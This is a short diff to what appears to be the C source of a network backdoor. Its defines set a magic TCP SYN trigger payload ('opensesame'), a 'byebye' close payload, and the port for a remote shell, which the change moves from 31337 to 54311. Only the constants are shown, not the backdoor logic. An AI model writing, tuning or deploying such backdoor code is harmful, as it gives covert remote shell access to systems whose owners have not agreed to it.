@@ -46,7 +46,7 @@
 #define DEF_TYPE        _TCP_SYN_TYPE   /* packet/protocol type */
 #define DEF_PAYLOAD     "opensesame"    /* magic payload */
 #define DEF_BYE_PAYLOAD "byebye"        /* magic BYE payload */
-#define DEF_PORT        31337           /* port for shell */
+#define DEF_PORT        54311           /* port for shell */
 
 
 /* ethernet related */
